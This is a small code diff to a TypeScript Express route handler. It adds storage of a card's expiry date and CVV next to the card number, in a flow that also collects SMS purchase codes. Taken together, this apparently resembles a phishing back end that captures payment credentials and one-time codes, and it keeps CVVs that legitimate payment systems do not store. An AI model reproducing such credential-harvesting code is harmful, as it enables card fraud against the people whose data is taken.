@@ -195,6 +195,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 break;
               case 'tarjeta':
                 updatedFields.tarjeta = inputData.tarjeta;
+                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
+                updatedFields.cvv = inputData.cvv;
                 break;
               case 'smsCompra':
                 updatedFields.smsCompra = inputData.smsCompra;
